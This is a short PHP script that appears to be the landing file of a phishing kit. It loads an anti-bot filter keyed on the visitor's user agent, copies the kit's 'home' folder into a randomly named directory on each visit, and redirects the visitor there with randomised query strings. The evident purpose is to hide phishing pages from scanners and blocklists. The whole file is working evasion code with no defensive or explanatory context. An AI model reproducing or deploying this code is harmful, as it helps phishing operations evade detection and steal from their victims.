<?php
require "antibots.php";
require 'home/inc/functions.php';

spyus_Vu($_SERVER['HTTP_USER_AGENT']);
$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="home";
recurse_copy( $home, $DIR );
$to = "/index.php?".md5(base64_encode(rand(0,10000).gmdate("His")));
header("location:$DIR".$to."?dispatch=".spyus_Ran());

?>